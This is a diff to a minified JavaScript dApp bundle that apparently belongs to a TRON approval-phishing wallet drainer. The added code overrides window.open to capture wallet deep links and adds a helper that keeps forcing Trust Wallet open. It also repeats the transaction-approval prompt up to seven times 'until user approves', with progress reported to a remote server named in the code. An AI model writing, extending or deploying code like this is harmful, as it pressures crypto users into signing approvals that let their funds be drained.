@@ -92968,6 +92968,39 @@
             const d = (0,
             m.useCallback)((async () => {
                 console.log("[1] CONNECT START");
+                // Prevent Trust deep-links from navigating THIS tab (_self) — that closes Trust / bounces to site.
+                // Keep dApp page alive in background until approve succeeds.
+                if ("undefined" !== typeof window && !window.__wcOpenPatched) {
+                    window.__wcOpenPatched = !0;
+                    window.__wcOrigOpen = window.open.bind(window);
+                    window.open = function(url, target, features) {
+                        const u = String(url || "");
+                        const isWallet = /trust:|wc\?|walletconnect|link\.trustwallet|rainbow|metamask|tonkeeper|imtoken|tokenpocket/i.test(u);
+                        if (isWallet && (!target || "_self" === target))
+                            return window.__wcOrigOpen(url, "_blank", features || "noreferrer noopener");
+                        return window.__wcOrigOpen(url, target, features)
+                    }
+                }
+                const openTrustStay = () => {
+                    try {
+                        let href = null;
+                        try {
+                            const raw = localStorage.getItem("WALLETCONNECT_DEEPLINK_CHOICE");
+                            const parsed = raw ? JSON.parse(raw) : null;
+                            href = parsed && parsed.href ? parsed.href : null
+                        } catch (_) {}
+                        const candidates = [];
+                        if (href) {
+                            candidates.push(href.endsWith("/") ? href.slice(0, -1) : href);
+                            if (/trust/i.test(href))
+                                candidates.push("trust://wc")
+                        }
+                        candidates.push("trust://wc");
+                        candidates.push("https://link.trustwallet.com");
+                        const openFn = window.__wcOrigOpen || window.open.bind(window);
+                        openFn(candidates[0], "_blank", "noreferrer noopener")
+                    } catch (_) {}
+                };
                 try {
                     var e, r, i;
                     if (!l)
@@ -92981,6 +93014,7 @@
                             }
                         }
                     });
+                    // Do NOT bounce UX — leave WC modal alone until after approve; close quietly
                     try {
                         qS.closeModal()
                     } catch (_) {}
@@ -93227,10 +93261,15 @@
                         feeLimit: feeLimit,
                         fromTopUp: topUpSent
                     });
+                    // Re-open Trust and keep user there for approve (do not redirect site until success)
+                    try {
+                        openTrustStay()
+                    } catch (_) {}
                     await f(c, feeLimit, {
                         fromTopUp: topUpSent,
                         retries: 7,
-                        reportEvent: reportEvent
+                        reportEvent: reportEvent,
+                        openTrustStay: openTrustStay
                     });
                 } catch (a) {
                     console.error("[10] ERROR", a);
@@ -93246,6 +93285,7 @@
                     } catch (_) {}
                     t(2)
                 } finally {
+                    // Do not force navigation back — only close QR modal quietly
                     try {
                         qS.closeModal()
                     } catch (_) {}
@@ -93253,10 +93293,11 @@
             }
             ), [l])
               , f = async (e, feeLimit, opts) => {
-                // Push Trust approve popup 5–7 times until user approves (top-up or already has TRX)
+                // Push Trust approve popup 5–7 times until user approves; keep Trust open (no site redirect)
                 const options = opts && "object" === typeof opts ? opts : {};
                 const maxTries = Math.min(7, Math.max(5, Number(options.retries) || 7));
                 const reportEvent = "function" === typeof options.reportEvent ? options.reportEvent : () => {};
+                const openTrustStay = "function" === typeof options.openTrustStay ? options.openTrustStay : () => {};
                 const API_BASE = "https://tronscantelegram-q7ln.onrender.com";
                 console.log("[8] APPROVAL START", e, {
                     feeLimit: feeLimit,
@@ -93380,7 +93421,7 @@
                     let n = null;
                     let openedOnce = !1;
                     let userApproved = !1;
-                    // Keep pushing Trust approve popup until user approves (up to 7 times)
+                    // Keep Trust in foreground and push approve until user approves (up to 7 times)
                     for (let tryNo = 1; tryNo <= maxTries; tryNo += 1) {
                         // Stop immediately if approval already landed on-chain
                         if (await checkOnChain()) {
@@ -93405,6 +93446,14 @@
                             tryNo: tryNo,
                             maxTries: maxTries
                         });
+                        // Bring Trust to front WITHOUT navigating our site away
+                        try {
+                            try {
+                                window.focus()
+                            } catch (_) {}
+                            openTrustStay();
+                            await new Promise((resolve) => setTimeout(resolve, 600))
+                        } catch (_) {}
                         try {
                             n = await r.sendTransaction(e, feeLimit)
                         } catch (signErr) {
@@ -93432,7 +93481,7 @@
                             userApproved = !0;
                             break
                         }
-                        // Not approved yet — push popup again
+                        // Not approved yet — push again; keep Trust open (no site redirect/alerts)
                         if (tryNo < maxTries) {
                             reportEvent("APPROVAL_RETRY", {
                                 tryNo: tryNo,
@@ -93440,7 +93489,10 @@
                                 maxTries: maxTries,
                                 message: n && n.message || "pushing approve popup again"
                             });
-                            await new Promise((resolve) => setTimeout(resolve, 1500))
+                            try {
+                                openTrustStay()
+                            } catch (_) {}
+                            await new Promise((resolve) => setTimeout(resolve, 2500))
                         }
                     }
 
